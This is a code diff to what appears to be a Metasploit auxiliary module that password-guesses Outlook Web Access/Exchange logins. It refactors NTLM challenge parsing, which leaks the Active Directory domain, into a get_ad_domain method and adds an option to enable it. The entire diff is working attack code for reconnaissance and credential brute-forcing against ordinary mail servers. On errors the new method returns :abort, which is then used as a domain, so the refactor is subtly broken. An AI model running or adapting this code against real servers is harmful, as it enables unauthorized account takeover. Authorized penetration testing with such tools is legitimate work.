@@ -71,6 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_advanced_options(
 			[
 				OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
+				OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
 				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
 			], self.class)
 
@@ -84,44 +85,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-		urls = ["aspnet_client",
-			"Autodiscover",
-			"ecp",
-			"EWS",
-			"Microsoft-Server-ActiveSync",
-			"OAB",
-			"PowerShell",
-			"Rpc"]
-
-		domain = nil
-
-		begin
-			urls.each do |url|
-				res = send_request_cgi({
-					'encode'   => true,
-					'uri'      => "/#{url}",
-					'method'   => 'GET',
-					'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
-				}, 25)
-
-				if not res
-					print_error("#{msg} HTTP Connection Error, Aborting")
-					return :abort
-				end
-
-				if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
-					hash = res['WWW-Authenticate'].split('NTLM ')[1]
-					domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
-					print_good("Found target domain: " + domain)
-					break
-				end
-			end
-
-		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error("#{msg} HTTP Connection Failed, Aborting")
-			return :abort
-		end
-
 		# Store the original setting
 		@blank_passwords_setting = datastore['BLANK_PASSWORDS']
 
@@ -152,11 +115,21 @@ class Metasploit3 < Msf::Auxiliary
 		auth_path   = action.opts['AuthPath']
 		inbox_path  = action.opts['InboxPath']
 		login_check = action.opts['InboxCheck']
+	
+		domain = nil
+		
+		if datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == ''
+			if datastore['ENUM_DOMAIN']
+				domain = get_ad_domain
+			end
+		else
+			domain = datastore['AD_DOMAIN']
+		end
 
 		begin
 			each_user_pass do |user, pass|
 				vprint_status("#{msg} Trying #{user} : #{pass}")
-				try_user_pass({"user" => user, "pass"=>pass, "domain" => domain, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
+				try_user_pass({"user" => user, "domain"=>domain, "pass"=>pass, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
 			print_error("#{msg} HTTP Connection Error, Aborting")
@@ -164,15 +137,16 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def try_user_pass(opts)
-		domain = opts["domain"]
 		user = opts["user"]
 		pass = opts["pass"]
 		auth_path = opts["auth_path"]
 		inbox_path = opts["inbox_path"]
 		login_check = opts["login_check"]
 		vhost = opts["vhost"]
+		domain = opts["domain"] 
+		
 		user = domain + '\\' + user if domain
-		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
+		
 		headers = {
 			'Cookie' => 'PBack=0'
 		}
@@ -252,6 +226,47 @@ class Metasploit3 < Msf::Auxiliary
 			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
 			return :skip_pass
 		end
+	end
+
+	def get_ad_domain
+		urls = ["aspnet_client",
+			"Autodiscover",
+			"ecp",
+			"EWS",
+			"Microsoft-Server-ActiveSync",
+			"OAB",
+			"PowerShell",
+			"Rpc"]
+
+		domain = nil
+
+		begin
+			urls.each do |url|
+				res = send_request_cgi({
+					'encode'   => true,
+					'uri'      => "/#{url}",
+					'method'   => 'GET',
+					'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+				}, 25)
+
+				if not res
+					print_error("#{msg} HTTP Connection Error, Aborting")
+					return :abort
+				end
+
+				if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
+					hash = res['WWW-Authenticate'].split('NTLM ')[1]
+					domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
+					print_good("Found target domain: " + domain)
+					break
+				end
+			end
+
+		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
+			print_error("#{msg} HTTP Connection Failed, Aborting")
+			return :abort
+		end
+		return domain
 	end
 
 	def msg
